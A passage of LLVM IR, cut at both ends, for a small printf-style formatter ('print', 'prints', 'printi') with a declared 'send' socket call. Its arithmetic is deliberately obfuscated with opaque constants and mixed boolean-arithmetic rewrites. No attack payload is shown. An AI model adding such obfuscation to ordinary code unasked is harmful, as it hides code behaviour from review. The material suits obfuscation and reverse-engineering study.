  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #6
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %341, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %344

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %328

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %344

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %329

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %70

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = xor i32 %53, -1
  %55 = xor i32 2, -1
  %56 = xor i32 -647242997, -1
  %57 = and i32 %54, -647242997
  %58 = and i32 %53, %56
  %59 = and i32 %55, -647242997
  %60 = and i32 2, %56
  %61 = or i32 %57, %58
  %62 = or i32 %59, %60
  %63 = xor i32 %61, %62
  %64 = or i32 %54, %55
  %65 = xor i32 %64, -1
  %66 = or i32 -647242997, %56
  %67 = and i32 %65, %66
  %68 = or i32 %63, %67
  %69 = or i32 %53, 2
  store i32 %68, i32* %8, align 4
  br label %45

; <label>:70:                                     ; preds = %45
  br label %71

; <label>:71:                                     ; preds = %97, %70
  %72 = load i8*, i8** %5, align 8
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp sge i32 %74, 48
  br i1 %75, label %76, label %81

; <label>:76:                                     ; preds = %71
  %77 = load i8*, i8** %5, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 57
  br label %81

; <label>:81:                                     ; preds = %76, %71
  %82 = phi i1 [ false, %71 ], [ %80, %76 ]
  br i1 %82, label %83, label %100

; <label>:83:                                     ; preds = %81
  %84 = load i32, i32* %7, align 4
  %85 = mul nsw i32 %84, 10
  store i32 %85, i32* %7, align 4
  %86 = load i8*, i8** %5, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = sub i32 0, 48
  %90 = add i32 %88, %89
  %91 = sub nsw i32 %88, 48
  %92 = load i32, i32* %7, align 4
  %93 = add i32 %92, -2043195972
  %94 = add i32 %93, %90
  %95 = sub i32 %94, -2043195972
  %96 = add nsw i32 %92, %90
  store i32 %95, i32* %7, align 4
  br label %97

; <label>:97:                                     ; preds = %83
  %98 = load i8*, i8** %5, align 8
  %99 = getelementptr inbounds i8, i8* %98, i32 1
  store i8* %99, i8** %5, align 8
  br label %71

; <label>:100:                                    ; preds = %81
  %101 = load i8*, i8** %5, align 8
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 115
  br i1 %104, label %105, label %146

; <label>:105:                                    ; preds = %100
  %106 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %107 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = icmp ule i32 %108, 40
  br i1 %109, label %110, label %120

; <label>:110:                                    ; preds = %105
  %111 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %106, i32 0, i32 3
  %112 = load i8*, i8** %111, align 8
  %113 = getelementptr i8, i8* %112, i32 %108
  %114 = bitcast i8* %113 to i32*
  %115 = sub i32 0, %108
  %116 = sub i32 0, 8
  %117 = add i32 %115, %116
  %118 = sub i32 0, %117
  %119 = add i32 %108, 8
  store i32 %118, i32* %107, align 8
  br label %125

; <label>:120:                                    ; preds = %105
  %121 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %106, i32 0, i32 2
  %122 = load i8*, i8** %121, align 8
  %123 = bitcast i8* %122 to i32*
  %124 = getelementptr i8, i8* %122, i32 8
  store i8* %124, i8** %121, align 8
  br label %125

; <label>:125:                                    ; preds = %120, %110
  %126 = phi i32* [ %114, %110 ], [ %123, %120 ]
  %127 = load i32, i32* %126, align 4
  %128 = sext i32 %127 to i64
  %129 = inttoptr i64 %128 to i8*
  store i8* %129, i8** %11, align 8
  %130 = load i8**, i8*** %4, align 8
  %131 = load i8*, i8** %11, align 8
  %132 = icmp ne i8* %131, null
  br i1 %132, label %133, label %135

; <label>:133:                                    ; preds = %125
  %134 = load i8*, i8** %11, align 8
  br label %136

; <label>:135:                                    ; preds = %125
  br label %136

; <label>:136:                                    ; preds = %135, %133
  %137 = phi i8* [ %134, %133 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), %135 ]
  %138 = load i32, i32* %7, align 4
  %139 = load i32, i32* %8, align 4
  %140 = call i32 @prints(i8** %130, i8* %137, i32 %138, i32 %139)
  %141 = load i32, i32* %9, align 4
  %142 = add i32 %141, -184348172
  %143 = add i32 %142, %140
  %144 = sub i32 %143, -184348172
  %145 = add nsw i32 %141, %140
  store i32 %144, i32* %9, align 4
  br label %341

; <label>:146:                                    ; preds = %100
  %147 = load i8*, i8** %5, align 8
  %148 = load i8, i8* %147, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 100
  br i1 %150, label %151, label %181

; <label>:151:                                    ; preds = %146
  %152 = load i8**, i8*** %4, align 8
  %153 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %154 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %153, i32 0, i32 0
  %155 = load i32, i32* %154, align 8
  %156 = icmp ule i32 %155, 40
  br i1 %156, label %157, label %166

; <label>:157:                                    ; preds = %151
  %158 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %153, i32 0, i32 3
  %159 = load i8*, i8** %158, align 8
  %160 = getelementptr i8, i8* %159, i32 %155
  %161 = bitcast i8* %160 to i32*
  %162 = sub i32 %155, -1217541747
  %163 = add i32 %162, 8
  %164 = add i32 %163, -1217541747
  %165 = add i32 %155, 8
  store i32 %164, i32* %154, align 8
  br label %171

; <label>:166:                                    ; preds = %151
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %153, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %157
  %172 = phi i32* [ %161, %157 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %152, i32 %173, i32 10, i32 1, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = sub i32 0, %176
  %179 = sub i32 %177, %178
  %180 = add nsw i32 %177, %176
  store i32 %179, i32* %9, align 4
  br label %341

; <label>:181:                                    ; preds = %146
  %182 = load i8*, i8** %5, align 8
  %183 = load i8, i8* %182, align 1
  %184 = zext i8 %183 to i32
  %185 = icmp eq i32 %184, 120
  br i1 %185, label %186, label %216

; <label>:186:                                    ; preds = %181
  %187 = load i8**, i8*** %4, align 8
  %188 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %189 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %188, i32 0, i32 0
  %190 = load i32, i32* %189, align 8
  %191 = icmp ule i32 %190, 40
  br i1 %191, label %192, label %200

; <label>:192:                                    ; preds = %186
  %193 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %188, i32 0, i32 3
  %194 = load i8*, i8** %193, align 8
  %195 = getelementptr i8, i8* %194, i32 %190
  %196 = bitcast i8* %195 to i32*
  %197 = sub i32 0, 8
  %198 = sub i32 %190, %197
  %199 = add i32 %190, 8
  store i32 %198, i32* %189, align 8
  br label %205

; <label>:200:                                    ; preds = %186
  %201 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %188, i32 0, i32 2
  %202 = load i8*, i8** %201, align 8
  %203 = bitcast i8* %202 to i32*
  %204 = getelementptr i8, i8* %202, i32 8
  store i8* %204, i8** %201, align 8
  br label %205

; <label>:205:                                    ; preds = %200, %192
  %206 = phi i32* [ %196, %192 ], [ %203, %200 ]
  %207 = load i32, i32* %206, align 4
  %208 = load i32, i32* %7, align 4
  %209 = load i32, i32* %8, align 4
  %210 = call i32 @printi(i8** %187, i32 %207, i32 16, i32 0, i32 %208, i32 %209, i32 97)
  %211 = load i32, i32* %9, align 4
  %212 = add i32 %211, 1751210852
  %213 = add i32 %212, %210
  %214 = sub i32 %213, 1751210852
  %215 = add nsw i32 %211, %210
  store i32 %214, i32* %9, align 4
  br label %341

; <label>:216:                                    ; preds = %181
  %217 = load i8*, i8** %5, align 8
  %218 = load i8, i8* %217, align 1
  %219 = zext i8 %218 to i32
  %220 = icmp eq i32 %219, 88
  br i1 %220, label %221, label %252

; <label>:221:                                    ; preds = %216
  %222 = load i8**, i8*** %4, align 8
  %223 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %224 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %223, i32 0, i32 0
  %225 = load i32, i32* %224, align 8
  %226 = icmp ule i32 %225, 40
  br i1 %226, label %227, label %236

; <label>:227:                                    ; preds = %221
  %228 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %223, i32 0, i32 3
  %229 = load i8*, i8** %228, align 8
  %230 = getelementptr i8, i8* %229, i32 %225
  %231 = bitcast i8* %230 to i32*
  %232 = add i32 %225, -2048731440
  %233 = add i32 %232, 8
  %234 = sub i32 %233, -2048731440
  %235 = add i32 %225, 8
  store i32 %234, i32* %224, align 8
  br label %241

; <label>:236:                                    ; preds = %221
  %237 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %223, i32 0, i32 2
  %238 = load i8*, i8** %237, align 8
  %239 = bitcast i8* %238 to i32*
  %240 = getelementptr i8, i8* %238, i32 8
  store i8* %240, i8** %237, align 8
  br label %241

; <label>:241:                                    ; preds = %236, %227
  %242 = phi i32* [ %231, %227 ], [ %239, %236 ]
  %243 = load i32, i32* %242, align 4
  %244 = load i32, i32* %7, align 4
  %245 = load i32, i32* %8, align 4
  %246 = call i32 @printi(i8** %222, i32 %243, i32 16, i32 0, i32 %244, i32 %245, i32 65)
  %247 = load i32, i32* %9, align 4
  %248 = sub i32 %247, -791976057
  %249 = add i32 %248, %246
  %250 = add i32 %249, -791976057
  %251 = add nsw i32 %247, %246
  store i32 %250, i32* %9, align 4
  br label %341

; <label>:252:                                    ; preds = %216
  %253 = load i8*, i8** %5, align 8
  %254 = load i8, i8* %253, align 1
  %255 = zext i8 %254 to i32
  %256 = icmp eq i32 %255, 117
  br i1 %256, label %257, label %288

; <label>:257:                                    ; preds = %252
  %258 = load i8**, i8*** %4, align 8
  %259 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %260 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %259, i32 0, i32 0
  %261 = load i32, i32* %260, align 8
  %262 = icmp ule i32 %261, 40
  br i1 %262, label %263, label %272

; <label>:263:                                    ; preds = %257
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %259, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %266 = getelementptr i8, i8* %265, i32 %261
  %267 = bitcast i8* %266 to i32*
  %268 = sub i32 %261, 133082439
  %269 = add i32 %268, 8
  %270 = add i32 %269, 133082439
  %271 = add i32 %261, 8
  store i32 %270, i32* %260, align 8
  br label %277

; <label>:272:                                    ; preds = %257
  %273 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %259, i32 0, i32 2
  %274 = load i8*, i8** %273, align 8
  %275 = bitcast i8* %274 to i32*
  %276 = getelementptr i8, i8* %274, i32 8
  store i8* %276, i8** %273, align 8
  br label %277

; <label>:277:                                    ; preds = %272, %263
  %278 = phi i32* [ %267, %263 ], [ %275, %272 ]
  %279 = load i32, i32* %278, align 4
  %280 = load i32, i32* %7, align 4
  %281 = load i32, i32* %8, align 4
  %282 = call i32 @printi(i8** %258, i32 %279, i32 10, i32 0, i32 %280, i32 %281, i32 97)
  %283 = load i32, i32* %9, align 4
  %284 = sub i32 %283, -839457087
  %285 = add i32 %284, %282
  %286 = add i32 %285, -839457087
  %287 = add nsw i32 %283, %282
  store i32 %286, i32* %9, align 4
  br label %341

; <label>:288:                                    ; preds = %252
  %289 = load i8*, i8** %5, align 8
  %290 = load i8, i8* %289, align 1
  %291 = zext i8 %290 to i32
  %292 = icmp eq i32 %291, 99
  br i1 %292, label %293, label %327

; <label>:293:                                    ; preds = %288
  %294 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %295 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %294, i32 0, i32 0
  %296 = load i32, i32* %295, align 8
  %297 = icmp ule i32 %296, 40
  br i1 %297, label %298, label %307

; <label>:298:                                    ; preds = %293
  %299 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %294, i32 0, i32 3
  %300 = load i8*, i8** %299, align 8
  %301 = getelementptr i8, i8* %300, i32 %296
  %302 = bitcast i8* %301 to i32*
  %303 = sub i32 %296, -1150930086
  %304 = add i32 %303, 8
  %305 = add i32 %304, -1150930086
  %306 = add i32 %296, 8
  store i32 %305, i32* %295, align 8
  br label %312

; <label>:307:                                    ; preds = %293
  %308 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %294, i32 0, i32 2
  %309 = load i8*, i8** %308, align 8
  %310 = bitcast i8* %309 to i32*
  %311 = getelementptr i8, i8* %309, i32 8
  store i8* %311, i8** %308, align 8
  br label %312

; <label>:312:                                    ; preds = %307, %298
  %313 = phi i32* [ %302, %298 ], [ %310, %307 ]
  %314 = load i32, i32* %313, align 4
  %315 = trunc i32 %314 to i8
  %316 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %315, i8* %316, align 1
  %317 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %317, align 1
  %318 = load i8**, i8*** %4, align 8
  %319 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %320 = load i32, i32* %7, align 4
  %321 = load i32, i32* %8, align 4
  %322 = call i32 @prints(i8** %318, i8* %319, i32 %320, i32 %321)
  %323 = load i32, i32* %9, align 4
  %324 = sub i32 0, %322
  %325 = sub i32 %323, %324
  %326 = add nsw i32 %323, %322
  store i32 %325, i32* %9, align 4
  br label %341

; <label>:327:                                    ; preds = %288
  br label %340

; <label>:328:                                    ; preds = %17
  br label %329

; <label>:329:                                    ; preds = %328, %35
  %330 = load i8**, i8*** %4, align 8
  %331 = load i8*, i8** %5, align 8
  %332 = load i8, i8* %331, align 1
  %333 = zext i8 %332 to i32
  call void @printchar(i8** %330, i32 %333)
  %334 = load i32, i32* %9, align 4
  %335 = sub i32 0, %334
  %336 = sub i32 0, 1
  %337 = add i32 %335, %336
  %338 = sub i32 0, %337
  %339 = add nsw i32 %334, 1
  store i32 %338, i32* %9, align 4
  br label %340

; <label>:340:                                    ; preds = %329, %327
  br label %341

; <label>:341:                                    ; preds = %340, %312, %277, %241, %205, %171, %136
  %342 = load i8*, i8** %5, align 8
  %343 = getelementptr inbounds i8, i8* %342, i32 1
  store i8* %343, i8** %5, align 8
  br label %12

; <label>:344:                                    ; preds = %29, %12
  %345 = load i8**, i8*** %4, align 8
  %346 = icmp ne i8** %345, null
  br i1 %346, label %347, label %350

; <label>:347:                                    ; preds = %344
  %348 = load i8**, i8*** %4, align 8
  %349 = load i8*, i8** %348, align 8
  store i8 0, i8* %349, align 1
  br label %350

; <label>:350:                                    ; preds = %347, %344
  %351 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %352 = bitcast %struct.__va_list_tag* %351 to i8*
  call void @llvm.va_end(i8* %352)
  %353 = load i32, i32* %9, align 4
  ret i32 %353
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #6

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %54

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %26, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %29

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 0, 1
  %24 = sub i32 %22, %23
  %25 = add nsw i32 %22, 1
  store i32 %24, i32* %11, align 4
  br label %26

; <label>:26:                                     ; preds = %21
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  br label %17

; <label>:29:                                     ; preds = %17
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %29
  store i32 0, i32* %7, align 4
  br label %41

; <label>:34:                                     ; preds = %29
  %35 = load i32, i32* %11, align 4
  %36 = load i32, i32* %7, align 4
  %37 = add i32 %36, -1223527064
  %38 = sub i32 %37, %35
  %39 = sub i32 %38, -1223527064
  %40 = sub nsw i32 %36, %35
  store i32 %39, i32* %7, align 4
  br label %41

; <label>:41:                                     ; preds = %34, %33
  %42 = load i32, i32* %8, align 4
  %43 = xor i32 %42, -1
  %44 = xor i32 2, -1
  %45 = xor i32 -2085340126, -1
  %46 = or i32 %43, %44
  %47 = or i32 -2085340126, %45
  %48 = xor i32 %46, -1
  %49 = and i32 %48, %47
  %50 = and i32 %42, 2
  %51 = icmp ne i32 %49, 0
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %41
  store i32 48, i32* %10, align 4
  br label %53

; <label>:53:                                     ; preds = %52, %41
  br label %54

; <label>:54:                                     ; preds = %53, %4
  %55 = load i32, i32* %8, align 4
  %56 = xor i32 %55, -1
  %57 = xor i32 1, -1
  %58 = xor i32 -1783201033, -1
  %59 = or i32 %56, %57
  %60 = or i32 -1783201033, %58
  %61 = xor i32 %59, -1
  %62 = and i32 %61, %60
  %63 = and i32 %55, 1
  %64 = icmp ne i32 %62, 0
  br i1 %64, label %83, label %65

; <label>:65:                                     ; preds = %54
  br label %66

; <label>:66:                                     ; preds = %76, %65
  %67 = load i32, i32* %7, align 4
  %68 = icmp sgt i32 %67, 0
  br i1 %68, label %69, label %82

; <label>:69:                                     ; preds = %66
  %70 = load i8**, i8*** %5, align 8
  %71 = load i32, i32* %10, align 4
  call void @printchar(i8** %70, i32 %71)
  %72 = load i32, i32* %9, align 4
  %73 = sub i32 0, 1
  %74 = sub i32 %72, %73
  %75 = add nsw i32 %72, 1
  store i32 %74, i32* %9, align 4
  br label %76

; <label>:76:                                     ; preds = %69
  %77 = load i32, i32* %7, align 4
  %78 = sub i32 %77, 2120293812
  %79 = add i32 %78, -1
  %80 = add i32 %79, 2120293812
  %81 = add nsw i32 %77, -1
  store i32 %80, i32* %7, align 4
  br label %66

; <label>:82:                                     ; preds = %66
  br label %83

; <label>:83:                                     ; preds = %82, %54
  br label %84

; <label>:84:                                     ; preds = %99, %83
  %85 = load i8*, i8** %6, align 8
  %86 = load i8, i8* %85, align 1
  %87 = icmp ne i8 %86, 0
  br i1 %87, label %88, label %102

; <label>:88:                                     ; preds = %84
  %89 = load i8**, i8*** %5, align 8
  %90 = load i8*, i8** %6, align 8
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  call void @printchar(i8** %89, i32 %92)
  %93 = load i32, i32* %9, align 4
  %94 = sub i32 0, %93
  %95 = sub i32 0, 1
  %96 = add i32 %94, %95
  %97 = sub i32 0, %96
  %98 = add nsw i32 %93, 1
  store i32 %97, i32* %9, align 4
  br label %99

; <label>:99:                                     ; preds = %88
  %100 = load i8*, i8** %6, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 1
  store i8* %101, i8** %6, align 8
  br label %84

; <label>:102:                                    ; preds = %84
  br label %103

; <label>:103:                                    ; preds = %115, %102
  %104 = load i32, i32* %7, align 4
  %105 = icmp sgt i32 %104, 0
  br i1 %105, label %106, label %121

; <label>:106:                                    ; preds = %103
  %107 = load i8**, i8*** %5, align 8
  %108 = load i32, i32* %10, align 4
  call void @printchar(i8** %107, i32 %108)
  %109 = load i32, i32* %9, align 4
  %110 = sub i32 0, %109
  %111 = sub i32 0, 1
  %112 = add i32 %110, %111
  %113 = sub i32 0, %112
  %114 = add nsw i32 %109, 1
  store i32 %113, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %106
  %116 = load i32, i32* %7, align 4
  %117 = add i32 %116, 1846972869
  %118 = add i32 %117, -1
  %119 = sub i32 %118, 1846972869
  %120 = add nsw i32 %116, -1
  store i32 %119, i32* %7, align 4
  br label %103

; <label>:121:                                    ; preds = %103
  %122 = load i32, i32* %9, align 4
  ret i32 %122
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %132

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %47

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %47

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %47

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, %43
  %45 = add i32 0, %44
  %46 = sub nsw i32 0, %43
  store i32 %45, i32* %21, align 4
  br label %47

; <label>:47:                                     ; preds = %42, %39, %36, %33
  %48 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %49 = getelementptr inbounds i8, i8* %48, i64 12
  %50 = getelementptr inbounds i8, i8* %49, i64 -1
  store i8* %50, i8** %17, align 8
  %51 = load i8*, i8** %17, align 8
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %76, %47
  %53 = load i32, i32* %21, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %89

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* %21, align 4
  %57 = load i32, i32* %11, align 4
  %58 = urem i32 %56, %57
  store i32 %58, i32* %18, align 4
  %59 = load i32, i32* %18, align 4
  %60 = icmp sge i32 %59, 10
  br i1 %60, label %61, label %76

; <label>:61:                                     ; preds = %55
  %62 = load i32, i32* %15, align 4
  %63 = sub i32 %62, 589556431
  %64 = sub i32 %63, 48
  %65 = add i32 %64, 589556431
  %66 = sub nsw i32 %62, 48
  %67 = sub i32 %65, 1733346490
  %68 = sub i32 %67, 10
  %69 = add i32 %68, 1733346490
  %70 = sub nsw i32 %65, 10
  %71 = load i32, i32* %18, align 4
  %72 = add i32 %71, 1337797560
  %73 = add i32 %72, %69
  %74 = sub i32 %73, 1337797560
  %75 = add nsw i32 %71, %69
  store i32 %74, i32* %18, align 4
  br label %76

; <label>:76:                                     ; preds = %61, %55
  %77 = load i32, i32* %18, align 4
  %78 = sub i32 0, %77
  %79 = sub i32 0, 48
  %80 = add i32 %78, %79
  %81 = sub i32 0, %80
  %82 = add nsw i32 %77, 48
  %83 = trunc i32 %81 to i8
  %84 = load i8*, i8** %17, align 8
  %85 = getelementptr inbounds i8, i8* %84, i32 -1
  store i8* %85, i8** %17, align 8
  store i8 %83, i8* %85, align 1
  %86 = load i32, i32* %11, align 4
  %87 = load i32, i32* %21, align 4
  %88 = udiv i32 %87, %86
  store i32 %88, i32* %21, align 4
  br label %52

; <label>:89:                                     ; preds = %52
  %90 = load i32, i32* %19, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %120

; <label>:92:                                     ; preds = %89
  %93 = load i32, i32* %13, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %116

; <label>:95:                                     ; preds = %92
  %96 = load i32, i32* %14, align 4
  %97 = xor i32 %96, -1
  %98 = xor i32 2, -1
  %99 = xor i32 -478753743, -1
  %100 = or i32 %97, %98
  %101 = or i32 -478753743, %99
  %102 = xor i32 %100, -1
  %103 = and i32 %102, %101
  %104 = and i32 %96, 2
  %105 = icmp ne i32 %103, 0
  br i1 %105, label %106, label %116

; <label>:106:                                    ; preds = %95
  %107 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %107, i32 45)
  %108 = load i32, i32* %20, align 4
  %109 = sub i32 0, 1
  %110 = sub i32 %108, %109
  %111 = add nsw i32 %108, 1
  store i32 %110, i32* %20, align 4
  %112 = load i32, i32* %13, align 4
  %113 = sub i32 0, -1
  %114 = sub i32 %112, %113
  %115 = add nsw i32 %112, -1
  store i32 %114, i32* %13, align 4
  br label %119

; <label>:116:                                    ; preds = %95, %92
  %117 = load i8*, i8** %17, align 8
  %118 = getelementptr inbounds i8, i8* %117, i32 -1
  store i8* %118, i8** %17, align 8
  store i8 45, i8* %118, align 1
  br label %119

; <label>:119:                                    ; preds = %116, %106
  br label %120

; <label>:120:                                    ; preds = %119, %89
